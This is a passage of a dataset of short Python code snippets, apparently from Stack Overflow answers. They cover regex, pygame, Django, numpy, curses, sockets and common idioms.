</snippet></ROW><ROW><id>11890801</id><snippet>with open("myFile.txt","r") as readfile, open("outFile.txt","w") as outfile:
    for line in readfile:
        count = 0
        for char in line:
            if char == ")":
                count -= 1
            elif char == "(":
                count += 1
            if count &lt; 0:
                break
         if count != 0 or text.count('"') % 2 != 0:
             outfile.write(line)
</snippet></ROW><ROW><id>11890801</id><snippet>import re
splitre = re.compile(".*?=(.*?)(?:(?=\s*?\S*?=)|(?=\s*$))")
with open("myFile.txt","r") as readfile, open("outFile.txt","w") as outfile:
    for line in readfile:
        def matchParens(text):
            count = 0
            for char in text:
                if char == ")":
                    count -= 1
                elif char == "(":
                    count += 1
                if count &lt; 0:
                    break
            return count != 0 or text.count('"') % 2 != 0
        if any(matchParens(text) for text in splitre.findall(line)):
            outfile.write(line)
</snippet></ROW><ROW><id>11890836</id><snippet>\</snippet></ROW><ROW><id>11890836</id><snippet>r''</snippet></ROW><ROW><id>11890836</id><snippet>&gt;&gt;&gt; re.sub('handle(.*?)', r'&lt;verse osisID="lol"&gt;\1&lt;/verse&gt;', 'handle a bunch of random text here.')
'&lt;verse osisID="lol"&gt;&lt;/verse&gt; a bunch of random text here.'
</snippet></ROW><ROW><id>11890836</id><snippet>r''</snippet></ROW><ROW><id>11890836</id><snippet>&gt;&gt;&gt; '\1'
'\x01'
&gt;&gt;&gt; '\\1'
'\\1'
&gt;&gt;&gt; r'\1'
'\\1'
&gt;&gt;&gt; print r'\1'
\1
</snippet></ROW><ROW><id>11890836</id><snippet>handle</snippet></ROW><ROW><id>11890836</id><snippet>.*?</snippet></ROW><ROW><id>11890836</id><snippet>&gt;&gt;&gt; re.sub('handle(.*)', r'&lt;verse osisID="lol"&gt;\1&lt;/verse&gt;', 'handle a bunch of random text here.')
'&lt;verse osisID="lol"&gt; a bunch of random text here.&lt;/verse&gt;'
</snippet></ROW><ROW><id>11890854</id><snippet>left</snippet></ROW><ROW><id>11890854</id><snippet>self.rect</snippet></ROW><ROW><id>11890854</id><snippet>left</snippet></ROW><ROW><id>11890854</id><snippet>right</snippet></ROW><ROW><id>11890854</id><snippet>update</snippet></ROW><ROW><id>11890854</id><snippet>update</snippet></ROW><ROW><id>11890854</id><snippet>update</snippet></ROW><ROW><id>11890854</id><snippet>while True:
  ...
    for event in pygame.event.get():
      if event.type == KEYDOWN:
        if event.key == K_RIGHT:
          player.goright = True
        if event.key == K_LEFT:
          player.goleft = True
      if event.type == KEYUP:
        if event.key == K_RIGHT:
          player.goright = False
        if event.key == K_LEFT:
          player.goleft = False

  players.update()
  players.draw(SCREEN)
  pygame.display.update()
  clock.tick(FPS)

def update(self):
  if self.goright and self.speed &lt; SPEED_MAX:
    self.speed += ACCEL_INCREMENT
  if self.goright and self.speed &gt; -SPEED_MAX:
    self.speed -= ACCEL_INCREMENT

  new_left_pos = self.rect.left + self.speed
  new_right_pos = self.rect.right + self.speed

  if new_left_pos &gt; 0 and new_right_pos &lt; 1024:
        self.rect.left += self.speed
        self.rect.right += self.speed
</snippet></ROW><ROW><id>11891019</id><snippet>lxml</snippet></ROW><ROW><id>11891019</id><snippet>easy_install --allow-hosts=lxml.de,*.python.org lxml
</snippet></ROW><ROW><id>11891019</id><snippet>easy_install --allow-hosts=lxml.de,*.python.org lxml==2.2.2
</snippet></ROW><ROW><id>11891019</id><snippet>2.2.2</snippet></ROW><ROW><id>11891019</id><snippet>easy_install --allow-hosts=lxml.de,*.python.org lxml==2.3
</snippet></ROW><ROW><id>11891053</id><snippet>def get_alertnum(user):
    return Alert.objects.filter(read=False, for_user=user).count()
</snippet></ROW><ROW><id>11891412</id><snippet>wt=json</snippet></ROW><ROW><id>11891463</id><snippet>return render_to_response('posting_draft.html',
    {'STATIC_URL':STATIC_URL, 'draft_l' : drafts, 'selected':"dr", alertnum: alertnum})
</snippet></ROW><ROW><id>11891463</id><snippet>0 != 0</snippet></ROW><ROW><id>11891463</id><snippet>return render_to_response('posting_draft.html',
    {'STATIC_URL':STATIC_URL, 'draft_l' : drafts, 'selected':"dr", 'alertnum': alertnum})
</snippet></ROW><ROW><id>11891604</id><snippet>collections.Counter</snippet></ROW><ROW><id>11891604</id><snippet>defaultdict(int)</snippet></ROW><ROW><id>11891604</id><snippet>Counter</snippet></ROW><ROW><id>11891604</id><snippet>experiments[experiment][classes[i]][classes[matches[experiment][i]]] += 1
</snippet></ROW><ROW><id>11891604</id><snippet>experiments = Counter()
...
experiments[experiment, classes[i], classes[matches[experiment][i]]] += 1
</snippet></ROW><ROW><id>11891904</id><snippet>gc</snippet></ROW><ROW><id>11891904</id><snippet>gc.get_objects()
</snippet></ROW><ROW><id>11891904</id><snippet>sys</snippet></ROW><ROW><id>11891904</id><snippet>getrefcount</snippet></ROW><ROW><id>11891904</id><snippet>&gt;&gt;&gt; x = object()
&gt;&gt;&gt; sys.getrefcount(x)
2
&gt;&gt;&gt; y = x
&gt;&gt;&gt; sys.getrefcount(x)
3
</snippet></ROW><ROW><id>11892030</id><snippet>final_ads = {}
for a in ads:
    final_ads.setdefault(a['spot_id'], []).append(a)
</snippet></ROW><ROW><id>11892030</id><snippet>setdefault</snippet></ROW><ROW><id>11892089</id><snippet>pygame.init()
screen = pygame.display.set_mode((640, 480))

screen.fill((0,0,0))

while True:

    for event in pygame.event.get():
        if event.type == QUIT:
            pygame.quit()
            sys.exit()

        if event.type == MOUSEBUTTONDOWN:
            # draw background first (however)
            screen.fill((0,0,0))

            # draw your other layers (mouse image)

            # draw the circle
            color = (255,255,255)
            posx,posy = pygame.mouse.get_pos()
            pygame.draw.circle(screen, color, (posx,posy), 50)

    pygame.display.update()
</snippet></ROW><ROW><id>11892089</id><snippet>mousec</snippet></ROW><ROW><id>11892089</id><snippet>last_mouse_pos = None

while True:

    for event in pygame.event.get():
        if event.type == QUIT:
            pygame.quit()
            sys.exit

        if event.type == MOUSEBUTTONDOWN:
            last_mouse_pos = pygame.mouse.get_pos()

        elif event.type == KEYDOWN and event.unicode == 'c':
            # clear the circle when pressing the 'c' key
            last_mouse_pos = None

    screen.blit(background,(0,0))
    x,y = pygame.mouse.get_pos()
    x -= mousec.get_width()/2
    y -= mousec.get_height()/2

    screen.blit(mousec, (x,y))

    if last_mouse_pos:
        color = (100,100,100)
        posx,posy = last_mouse_pos
        pygame.draw.circle(screen, color, (posx,posy), 50)

    pygame.display.update()
</snippet></ROW><ROW><id>11892089</id><snippet>set</snippet></ROW><ROW><id>11892089</id><snippet>mouse_clicks = set()

while True:

    for event in pygame.event.get():
        if event.type == QUIT:
            pygame.quit()
            sys.exit

        if event.type == MOUSEBUTTONDOWN:
            mouse_clicks.add(pygame.mouse.get_pos())

        elif event.type == KEYDOWN and event.unicode == 'c':
            # clear the circle when pressing the 'c' key
            mouse_clicks.clear()

    screen.blit(background,(0,0))
    x,y = pygame.mouse.get_pos()
    x -= mousec.get_width()/2
    y -= mousec.get_height()/2

    screen.blit(mousec, (x,y))

    for pos in mouse_clicks:
        color = (100,100,100)
        posx,posy = pos
        pygame.draw.circle(screen, color, (posx,posy), 50)

    pygame.display.update()
</snippet></ROW><ROW><id>11892178</id><snippet>class Classname:
   def foo(self): pass

for name, fn in inspect.getmembers(Classname):
    if isinstance(fn, types.UnboundMethodType):
        setattr(Classname, name, decorator(fn))
</snippet></ROW><ROW><id>11892178</id><snippet>types.UnboundMethodType</snippet></ROW><ROW><id>11892178</id><snippet>types.FunctionType.</snippet></ROW><ROW><id>11892178</id><snippet>import types

class DecoMeta(type):
   def __new__(cls, name, bases, attrs):

      for attr_name, attr_value in attrs.iteritems():
         if isinstance(attr_value, types.FunctionType):
            attrs[attr_name] = cls.deco(attr_value)

      return super(DecoMeta, cls).__new__(cls, name, bases, attrs)

   @classmethod
   def deco(cls, func):
      def wrapper(*args, **kwargs):
         print "before",func.func_name
         func(*args, **kwargs)
         print "after",func.func_name
      return wrapper

class MyKlass(object):
   __metaclass__ = DecoMeta

   def func1(self): 
      pass

MyKlass().func1()
</snippet></ROW><ROW><id>11892395</id><snippet>from django.contrib.auth import authenticate, login
from django.http import HttpResponse, HttpResponseBadRequest
from django.utils import simplejson

def ajax_login(request):
    if request.method == 'POST':
        username = request.POST.get('username', '').strip()
        password = request.POST.get('password', '').strip()
        if username and password:
            # Test username/password combination
            user = authenticate(username=username, password=password)
            # Found a match
            if user is not None:
                # User is active
                if user.is_active:
                    # Officially log the user in
                    login(self.request, user)
                    data = {'success': True}
                else:
                    data = {'success': False, 'error': 'User is not active'}
            else:
                data = {'success': False, 'error': 'Wrong username and/or password'}

            return HttpResponse(simplejson.dumps(data), mimetype='application/json')

    # Request method is not POST or one of username or password is missing
    return HttpResponseBadRequest()        
</snippet></ROW><ROW><id>11892398</id><snippet>&gt;&gt;&gt; import json
&gt;&gt;&gt; st = '{"A":"A value","B":{ "B1":"B1 value", "B2":"B2 value" },"C":{ "c
_url":"http:\/\/someurl:someport\/somefolder\/somefile" }}'
&gt;&gt;&gt; json.loads(st)
{u'A': u'A value', u'C': {u'c_url': u'http://someurl:someport/somefolder/somefile'}, u'B': {u'B1': u
'B1 value', u'B2': u'B2 value'}}
</snippet></ROW><ROW><id>11892398</id><snippet>url.split('/')[url.count('/')]
</snippet></ROW><ROW><id>11892426</id><snippet>filter</snippet></ROW><ROW><id>11892426</id><snippet>&gt;&gt;&gt; all_data = [['abc', 123], ['cde', 234], ['fgh', 345]]    
&gt;&gt;&gt; ids = set(['abc', 'fgh'])
&gt;&gt;&gt; values = filter(lambda value: value[0] in ids, all_data)
&gt;&gt;&gt; values
[['abc', 123], ['fgh', 345]]
&gt;&gt;&gt; 
</snippet></ROW><ROW><id>11892426</id><snippet>&gt;&gt;&gt; all_data_dict = {'abc':all_data, 'cde':all_data, 'fgh':all_data}
&gt;&gt;&gt; ids = set(['abc', 'fgh'])
&gt;&gt;&gt; dict(filter(lambda value: value[0] in ids, all_data_dict.items()))
{'abc': [['abc', 123], ['cde', 234], ['fgh', 345]], 'fgh': [['abc', 123], ['cde', 234], ['fgh', 345]]}
</snippet></ROW><ROW><id>11892712</id><snippet>StringIO</snippet></ROW><ROW><id>11892712</id><snippet>open</snippet></ROW><ROW><id>11892712</id><snippet>StringIO</snippet></ROW><ROW><id>11892712</id><snippet>StringIO</snippet></ROW><ROW><id>11892712</id><snippet>StringIO</snippet></ROW><ROW><id>11892712</id><snippet>tempfile</snippet></ROW><ROW><id>11892712</id><snippet>import os
import tempfile
from contextlib import contextmanager

@contextmanager
def tempinput(data):
    temp = tempfile.NamedTemporaryFile(delete=False)
    temp.write(data)
    temp.close()
    yield temp.name
    os.unlink(temp.name)

with tempinput('Some data.\nSome more data.') as tempfilename:
    processFile(tempfilename)
</snippet></ROW><ROW><id>11892838</id><snippet>ck</snippet></ROW><ROW><id>11892838</id><snippet>payload</snippet></ROW><ROW><id>11892838</id><snippet>payload = {'inUserName': 'USERNAME/EMAIL', 'inUserPass': 'PASSWORD'}
url = 'http://www.locationary.com/home/index2.jsp'
requests.post(url, data=payload)
</snippet></ROW><ROW><id>11892878</id><snippet>Popen</snippet></ROW><ROW><id>11892878</id><snippet>&gt;&gt;&gt; def do_ls():
...     print "I'm about to ls"
...     ls = subprocess.Popen('ls', stdout=subprocess.PIPE)
...     output = ls.communicate()[0] #wait for the process to finish, capture stdout
...     print 'ls output:'
...     print output
...     print 'done.'
</snippet></ROW><ROW><id>11893045</id><snippet>import numpy as np
X = np.random.rand(10, 2)
</snippet></ROW><ROW><id>11893045</id><snippet>X[7] = np.nan
my_dist = pdist(X, "euclidean")
</snippet></ROW><ROW><id>11893045</id><snippet>my_dist = np.ma.array(my_dist, mask = ~np.isfinite(my_dist))
</snippet></ROW><ROW><id>11893174</id><snippet>&gt;&gt; mafs = [(1:16)' (17:32)']
mafs =
     1    17
     2    18
     3    19
     4    20
     5    21
     6    22
     7    23
     8    24
     9    25
    10    26
    11    27
    12    28
    13    29
    14    30
    15    31
    16    32

&gt;&gt; reshape(mafs,[4 4 2])
ans(:,:,1) =
     1     5     9    13
     2     6    10    14
     3     7    11    15
     4     8    12    16
ans(:,:,2) =
    17    21    25    29
    18    22    26    30
    19    23    27    31
    20    24    28    32
</snippet></ROW><ROW><id>11893174</id><snippet>&gt;&gt;&gt; import numpy as np
&gt;&gt;&gt; mafs = np.c_[np.arange(1,17), np.arange(17,33)]
&gt;&gt;&gt; mafs.shape
(16, 2)
&gt;&gt;&gt; mafs[:,0]
array([ 1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14, 15, 16])
&gt;&gt;&gt; mafs[:,1]
array([17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32])

&gt;&gt;&gt; r = np.reshape(mafs, (4,4,2), order="F")
&gt;&gt;&gt; r.shape
(4, 4, 2)
&gt;&gt;&gt; r[:,:,0]
array([[ 1,  5,  9, 13],
       [ 2,  6, 10, 14],
       [ 3,  7, 11, 15],
       [ 4,  8, 12, 16]])
&gt;&gt;&gt; r[:,:,1]
array([[17, 21, 25, 29],
       [18, 22, 26, 30],
       [19, 23, 27, 31],
       [20, 24, 28, 32]])
</snippet></ROW><ROW><id>11893254</id><snippet>backend      : Agg
</snippet></ROW><ROW><id>11893254</id><snippet>cp /usr/local/lib/python2.6/dist-packages/matplotlib-1.1.0-py2.6-linux-x86_64.egg/matplotlib/mpl-data/matplotlibrc ~/.matplotlib/matplotlibrc
</snippet></ROW><ROW><id>11893287</id><snippet>def download(url, max_retries=10):
    for i in range(max_retries):
        print('Downloading: ' + url)
        r = requests.get(url)

        print('Status code: ' + str(r.status_code))

        if r.status_code == requests.codes.ok: return r.content
    return None

download('http://us.battle.net/sc2/en/game/unit/')
</snippet></ROW><ROW><id>11893357</id><snippet>virtualenv</snippet></ROW><ROW><id>11893357</id><snippet>daniel@redhotcar:~/tmp$ virtualenv myenv
New python executable in myenv/bin/python
Installing distribute....................................................................................................................................................................................done.
Installing pip...............done.
daniel@redhotcar:~/tmp$ cd myenv/
daniel@redhotcar:~/tmp/myenv$ bin/pip install mechanize
Downloading/unpacking mechanize
  Downloading mechanize-0.2.5.zip (445Kb): 445Kb downloaded
  Running setup.py egg_info for package mechanize

Installing collected packages: mechanize
  Running setup.py install for mechanize

Successfully installed mechanize
Cleaning up...
daniel@redhotcar:~/tmp/myenv$ bin/python
Python 2.7.2+ (default, Oct  4 2011, 20:06:09) 
[GCC 4.6.1] on linux2
Type "help", "copyright", "credits" or "license" for more information.
&gt;&gt;&gt; import mechanize
&gt;&gt;&gt; mechanize
&lt;module 'mechanize' from '/home/daniel/tmp/myenv/local/lib/python2.7/site-packages/mechanize/__init__.pyc'&gt;
&gt;&gt;&gt; 
</snippet></ROW><ROW><id>11893357</id><snippet>apt-get install python-virtualenv</snippet></ROW><ROW><id>11893506</id><snippet>import subprocess
subprocess.call(['rm','-r','/home/nathan/emptytest'])
</snippet></ROW><ROW><id>11893560</id><snippet>db.BlobProperty()</snippet></ROW><ROW><id>11893560</id><snippet>class Guestbook</snippet></ROW><ROW><id>11893560</id><snippet>class Image</snippet></ROW><ROW><id>11893776</id><snippet>customContextMenuRequested</snippet></ROW><ROW><id>11893776</id><snippet>QPoint</snippet></ROW><ROW><id>11893776</id><snippet>def show_header_context_menu(self, position):
    column = self.headers.logicalIndexAt(position)
</snippet></ROW><ROW><id>11893872</id><snippet>xorsLib = windll.LoadLibrary("xors3d.dll")</snippet></ROW><ROW><id>11893924</id><snippet>if house.garage:
    if house.garage == '3 car':
        # do something with house.garage
</snippet></ROW><ROW><id>11893924</id><snippet>if house.garage and house.garage == '3 car':
    # do something with house.garage
</snippet></ROW><ROW><id>11893939</id><snippet>class Product(RandomPrimaryIdModel):
    class Meta:
        abstract=True
</snippet></ROW><ROW><id>11893939</id><snippet>Mattress.objects.filter()</snippet></ROW><ROW><id>11893939</id><snippet>from django.db import models
from django.contrib.contenttypes.models import ContentType
from django.contrib.contenttypes import generic

class Product(RandomPrimaryIdModel):

    feature1 = models.CharField(max_length=20, blank=True, null=True)
    feature2 = models.CharField(max_length=20, blank=True, null=True)
    feature3 = models.CharField(max_length=20, blank=True, null=True)

    content_type = models.ForeignKey(ContentType)
    object_id = models.PositiveIntegerField()
    content_object = generic.GenericForeignKey('content_type', 'object_id')
</snippet></ROW><ROW><id>11893939</id><snippet>content_object</snippet></ROW><ROW><id>11893939</id><snippet>p_type = ContentType.objects.get(name="mattress")
Product.objects.filter(content_type=p_type)
</snippet></ROW><ROW><id>11894005</id><snippet>--version</snippet></ROW><ROW><id>11894237</id><snippet>__del__</snippet></ROW><ROW><id>11894237</id><snippet>__del__</snippet></ROW><ROW><id>11894237</id><snippet>__del__</snippet></ROW><ROW><id>11894237</id><snippet>__del__</snippet></ROW><ROW><id>11894237</id><snippet>with</snippet></ROW><ROW><id>11894237</id><snippet>with &lt;context manager&gt; as var:
    # do something
# "context closed", whatever that means - for resources, usually cleanup
</snippet></ROW><ROW><id>11894237</id><snippet>from contextlib import contextmanager


@contextmanager
def debug_wait_keypress():
    fd = sys.stdin.fileno()
    oldterm = termios.tcgetattr(fd)
    newattr = termios.tcgetattr(fd)
    newattr[3] = newattr[3] &amp; ~termios.ICANON &amp; ~termios.ECHO
    termios.tcsetattr(fd, termios.TCSANOW, newattr)
    oldflags = fcntl.fcntl(fd, fcntl.F_GETFL)
    fcntl.fcntl(fd, fcntl.F_SETFL, oldflags | os.O_NONBLOCK)
    try:
        yield
    finally:
        termios.tcsetattr(fd, termios.TCSAFLUSH, oldterm)
        fcntl.fcntl(fd, fcntl.F_SETFL, oldflags)
</snippet></ROW><ROW><id>11894237</id><snippet>wait</snippet></ROW><ROW><id>11894311</id><snippet>/tmp/script-foo/control/&lt;id&gt;.socket
</snippet></ROW><ROW><id>11894311</id><snippet>uid = generate_unique_id()
sock = socket.socket(AF_UNIX)
sock.bind('/tmp/script-foo/control/%s.socket' % uid)
# and set other sock options like timeout

taskList = [a,b,c]
for task in taskList:
    runningTask = start task in thread/process
    while runningTask is running:
        if new data on socket, with timeout N ms
            if command == restart:
                kill runningTask
                taskList = [a,b,c]
                break
            else:
                process command
</snippet></ROW><ROW><id>11894311</id><snippet>jobid = request.get('id')
cmd = request.get('cmd')
sock = socket.socket(socket.AF_UNIX)
sock.connect('/tmp/script-foo/control/%s.socket' % jobid)
sock.sendall(cmd)
sock.close()
</snippet></ROW><ROW><id>11894311</id><snippet>import sys
import os
import socket
import uuid 
import time 

# Options
TASKS_DIR = "."

def main():

    sessionId = str(uuid.uuid4())

    print 'Session ID: '+ sessionId
    sys.stdout.write ('&lt;br /&gt;&lt;a href="cgi_send.py?cmd=test&amp;session=' + sessionId +'" target="_blank"&gt;Send test command&lt;/a&gt;')
    sys.stdout.flush()

    address = os.path.join(TASKS_DIR, '%s.socket' % sessionId)

    sock = socket.socket(socket.AF_UNIX)
    sock.setblocking(0)
    sock.settimeout(.1)
    sock.bind(address)
    sock.listen(1)


    fakeTasks = [foo_task, foo_task, foo_task]

    try:
        for task in fakeTasks:

            # pretend we started a task
            runningTask = task()
            # runningTask = Thread(target=task) 
            # runningTask.start()

            # while runningTask.is_alive():   
            while runningTask:
                conn = None
                try:
                    conn, addr = sock.accept()
                    data = conn.recv(100).strip()

                except socket.timeout:
                    # nothing ready from a client
                    continue

                except socket.error, e:
                    print "&lt;br /&gt;Connection Error from client"

                else:
                    print "&lt;br /&gt;"+ data
                    sys.stdout.flush()
                    conn.close()

                    # for the thread version, you will need some 
                    # approach to kill or interrupt it. 
                    # This is just simulating. 
                    if data == "CANCEL":
                        # temp way to cancel our task
                        print "&lt;br /&gt;Cancelling current task." 
                        runningTask = False

                    elif data == "QUIT":
                        print "&lt;br /&gt;Quitting entire process." 
                        runningTask = False 
                        fakeTasks[:] = []

                finally:
                    if conn:
                        conn.close()

    finally:
        sock.close()
        os.remove(address)



def foo_task():
    print 'foo task'
    return True


if __name__ == '__main__':
    sys.stdout.write("Content-type:text/html;charset=utf-8\r\n\r\n")
    sys.stdout.write('&lt;!DOCTYPE html&gt;\n&lt;html&gt;&lt;head&gt;&lt;title&gt;Test&lt;/title&gt;&lt;/head&gt;&lt;body&gt;')

    main()

    print '&lt;/body&gt;&lt;/html&gt;'
    sys.exit()
</snippet></ROW><ROW><id>11894516</id><snippet>data = """Form Dosage ReferenceDrug drugname activeingred INJECTABLE; INJECTION 20,000 UNITS/ML LIQUAEMIN   SODIUM HEPARIN  SODIUM  INJECTABLE; INJECTION   40,000 UNITS/ML LIQUAEMIN   SODIUM HEPARIN  SODIUM  INJECTABLE; INJECTION   5,000 UNITS/ML  LIQUAEMIN   SODIUM HEPARIN  SODIUM  INJECTABLE""".split('; ')

from collections import namedtuple

# define class DrugData as a namedtuple, using the headers from data[0]
DrugData = namedtuple("DrugData", data[0])

# use a list comprehension to create a DrugData for each data line
druglist = [DrugData(*line.split('\t')) for line in data[1:]]

# access each tuple in druglist, using attribute access to individual fields
for d in druglist:
    print "%s | %s | %s" % (d.ReferenceDrug, d.Form, d.Dosage)
</snippet></ROW><ROW><id>11894516</id><snippet>LIQUAEMIN | INJECTION | 20,000 UNITS/ML
LIQUAEMIN | INJECTION | 40,000 UNITS/ML
LIQUAEMIN | INJECTION | 5,000 UNITS/ML
</snippet></ROW><ROW><id>11894516</id><snippet>drugname</snippet></ROW><ROW><id>11894516</id><snippet>drugname</snippet></ROW><ROW><id>11894516</id><snippet>(drugname, Dosage)</snippet></ROW><ROW><id>11894516</id><snippet>drugname</snippet></ROW><ROW><id>11894516</id><snippet>from collections import defaultdict
</snippet></ROW><ROW><id>11894516</id><snippet>meds_dict = defaultdict(list)
</snippet></ROW><ROW><id>11894516</id><snippet>list</snippet></ROW><ROW><id>11894516</id><snippet>meds_dict[DrugName].append(meds)
</snippet></ROW><ROW><id>11894552</id><snippet>scr.getch()</snippet></ROW><ROW><id>11894552</id><snippet>curses.KEY_MOUSE</snippet></ROW><ROW><id>11894552</id><snippet>curses.getmouse()</snippet></ROW><ROW><id>11894552</id><snippet>import curses
from contextlib import contextmanager

@contextmanager
def open_screen():
    scr = curses.initscr()
    curses.noecho()
    curses.cbreak()
    scr.keypad(1)
    try:
        yield scr
    finally:
        curses.nocbreak()
        scr.keypad(0)
        curses.echo()
        curses.endwin()

curses_mouse_states = {
    curses.BUTTON1_PRESSED: 'Button 1 Pressed', 
    curses.BUTTON1_RELEASED: 'Button 1 Released', 
    curses.BUTTON1_CLICKED: 'Button 1 Clicked',
    curses.BUTTON1_DOUBLE_CLICKED: 'Button 1 Double-Clicked',
    curses.BUTTON1_TRIPLE_CLICKED: 'Button 1 Triple-Clicked',

    curses.BUTTON2_PRESSED: 'Button 2 Pressed', 
    curses.BUTTON2_RELEASED: 'Button 2 Released', 
    curses.BUTTON2_CLICKED: 'Button 2 Clicked',
    curses.BUTTON2_DOUBLE_CLICKED: 'Button 2 Double-Clicked',
    curses.BUTTON2_TRIPLE_CLICKED: 'Button 2 Triple-Clicked',

    curses.BUTTON3_PRESSED: 'Button 3 Pressed', 
    curses.BUTTON3_RELEASED: 'Button 3 Released', 
    curses.BUTTON3_CLICKED: 'Button 3 Clicked',
    curses.BUTTON3_DOUBLE_CLICKED: 'Button 3 Double-Clicked',
    curses.BUTTON3_TRIPLE_CLICKED: 'Button 3 Triple-Clicked',

    curses.BUTTON4_PRESSED: 'Button 4 Pressed', 
    curses.BUTTON4_RELEASED: 'Button 4 Released', 
    curses.BUTTON4_CLICKED: 'Button 4 Clicked',
    curses.BUTTON4_DOUBLE_CLICKED: 'Button 4 Double-Clicked',
    curses.BUTTON4_TRIPLE_CLICKED: 'Button 4 Triple-Clicked',

    curses.BUTTON_SHIFT: 'Button Shift', 
    curses.BUTTON_CTRL: 'Button Ctrl', 
    curses.BUTTON_ALT: 'Button Alt'
}

with open_screen() as scr:
    curses.mousemask(-1)
    while True:
        c = scr.getch()
        if c == curses.KEY_MOUSE:
            mouse_state = curses.getmouse()[4]
            states = '; '.join(state_string for state, state_string 
                               in curses_mouse_states.viewitems() 
                               if mouse_state &amp; state)
            scr.addstr(0, 0, states)
            scr.clrtoeol()
            scr.refresh()
        elif c == ord('q'):
            break
</snippet></ROW><ROW><id>11894706</id><snippet>alldata.append(window)

for row in reader:
    window = slideWindow(window, row, NUM_ATTRIBUTES)
    alldata.append(window)
</snippet></ROW><ROW><id>11894706</id><snippet>slideWindow</snippet></ROW><ROW><id>11894706</id><snippet>window</snippet></ROW><ROW><id>11894706</id><snippet>deque</snippet></ROW><ROW><id>11894706</id><snippet>deque</snippet></ROW><ROW><id>11894706</id><snippet>slideWindow</snippet></ROW><ROW><id>11894706</id><snippet>window</snippet></ROW><ROW><id>11894706</id><snippet>slideWindow</snippet></ROW><ROW><id>11894859</id><snippet>"argument 1"</snippet></ROW><ROW><id>11894859</id><snippet>python testProgram.py "argument 1" 'argument 2'
</snippet></ROW><ROW><id>11894859</id><snippet>bash</snippet></ROW><ROW><id>11894859</id><snippet>$HOME</snippet></ROW><ROW><id>11894918</id><snippet>i</snippet></ROW><ROW><id>11894918</id><snippet>range</snippet></ROW><ROW><id>11894918</id><snippet>i</snippet></ROW><ROW><id>11894992</id><snippet>\w</snippet></ROW><ROW><id>11895071</id><snippet>socket.inet_pton()</snippet></ROW><ROW><id>11895071</id><snippet>import socket
from binascii import hexlify

def IPV6_to_int(ipv6_addr):
    return int(hexlify(socket.inet_pton(socket.AF_INET6, ipv6_addr)), 16)

&gt;&gt;&gt; IPV6_to_int('fe80:0000:0000:0000:021b:77ff:fbd6:7860')
338288524927261089654170743795120240736L
&gt;&gt;&gt; IPV6_to_int('fe80::021b:77ff:fbd6:7860')
338288524927261089654170743795120240736L
</snippet></ROW><ROW><id>11895075</id><snippet>os.system("open \"/Applications/Photo Booth.app\"")
</snippet></ROW><ROW><id>11895075</id><snippet>os.system('open "/Applications/Photo Booth.app"')
</snippet></ROW><ROW><id>11895075</id><snippet>close</snippet></ROW><ROW><id>11895075</id><snippet>kill</snippet></ROW><ROW><id>11895075</id><snippet>osascript</snippet></ROW><ROW><id>11895075</id><snippet>osascript -e 'tell application "PaxsDodgyApp" to quit'
</snippet></ROW><ROW><id>11895170</id><snippet>user = User()
user.Keys = "foo"
</snippet></ROW><ROW><id>11895218</id><snippet>gdk.Event</snippet></ROW><ROW><id>11895218</id><snippet>gobject.GObject</snippet></ROW><ROW><id>11895218</id><snippet>__gsignals__</snippet></ROW><ROW><id>11895218</id><snippet>class ApplicationFrame(gobject.GObject):
    __gsignals__ = {
        'data-received': (gobject.SIGNAL_RUN_FIRST, gobject.TYPE_NONE, (gobject.TYPE_PYOBJECT,))
    }

    def do_data_recieved(self, data):
        # default handler
</snippet></ROW><ROW><id>11895297</id><snippet>src</snippet></ROW><ROW><id>11895297</id><snippet>http://apod.nasa.gov/</snippet></ROW><ROW><id>11895297</id><snippet>src</snippet></ROW><ROW><id>11895297</id><snippet>image/1208/Ma2011-2Tezel900.jpg</snippet></ROW><ROW><id>11895297</id><snippet>urlopen(...).read()</snippet></ROW><ROW><id>11895297</id><snippet>data = urlopen('http://apod.nasa.gov/image/1208/Ma2011-2Tezel900.jpg').read()
open('mypic.jpg', 'wb').write(data)
</snippet></ROW><ROW><id>11895326</id><snippet>__init__()</snippet></ROW><ROW><id>11895326</id><snippet>self.mapdata = [[fillnumber] * width] * height
</snippet></ROW><ROW><id>11895326</id><snippet>height</snippet></ROW><ROW><id>11895326</id><snippet>self.mapdata = [[fillnumber] * width for x in xrange(height)]
</snippet></ROW><ROW><id>11895345</id><snippet>man screen</snippet></ROW><ROW><id>11895778</id><snippet>&gt;&gt;&gt; text = '2,4,6,8|10,12,14,16|18,20,22,24'
&gt;&gt;&gt; my_data = [x.split(',') for x in text.split('|')]
&gt;&gt;&gt; my_data
[['2', '4', '6', '8'], ['10', '12', '14', '16'], ['18', '20', '22', '24']]
&gt;&gt;&gt; print my_data[1][2]
14
</snippet></ROW><ROW><id>11895778</id><snippet>int</snippet></ROW><ROW><id>11895778</id><snippet>&gt;&gt;&gt; [[int(y) for y in x.split(',')] for x in text.split('|')]
[[2, 4, 6, 8], [10, 12, 14, 16], [18, 20, 22, 24]]
</snippet></ROW><ROW><id>11895789</id><snippet>product = Product.objects.get(id=12)
try:
    mattress = product.mattress
    is_mattress = True
except Mattress.DoesNotExist:
    is_mattress = False
</snippet></ROW><ROW><id>11895893</id><snippet>http://search.twitter.com/search.json?q=PAROusuariosSUBTE</snippet></ROW><ROW><id>11896027</id><snippet>writer.writerow(str(d))
</snippet></ROW><ROW><id>11896027</id><snippet>writer.writerow(d)
</snippet></ROW><ROW><id>11896554</id><snippet>expression = (field + operator + value)("expression")
</snippet></ROW><ROW><id>11896554</id><snippet>expression = Group(field + operator + value)("expression")
</snippet></ROW><ROW><id>11896554</id><snippet>for f in tokenized['expr_list']: 
    field = f['field']
    op = f['operator']
    value = f['value']
    print field, op, value
</snippet></ROW><ROW><id>11896554</id><snippet>dump</snippet></ROW><ROW><id>11896554</id><snippet>tokenized.dump()</snippet></ROW><ROW><id>11896554</id><snippet>[[['foo', '=', 1], ['bar', '=', 2]]]
- expr_list: [['foo', '=', 1], ['bar', '=', 2]]
  - expression: ['bar', '=', 2]
    - field: bar
    - int: 2
    - operator: =
    - value: 2
</snippet></ROW><ROW><id>11896554</id><snippet>print tokenized['expr_list'][0].dump()</snippet></ROW><ROW><id>11896554</id><snippet>['foo', '=', 1]
- field: foo
- int: 1
- operator: =
- value: 1
</snippet></ROW><ROW><id>11896554</id><snippet>for f in tokenized['expr_list']: 
    field = f['field']
    op = f['operator']
    value = f['value']
    print field, op, value
</snippet></ROW><ROW><id>11896554</id><snippet>foo = 1
bar = 2
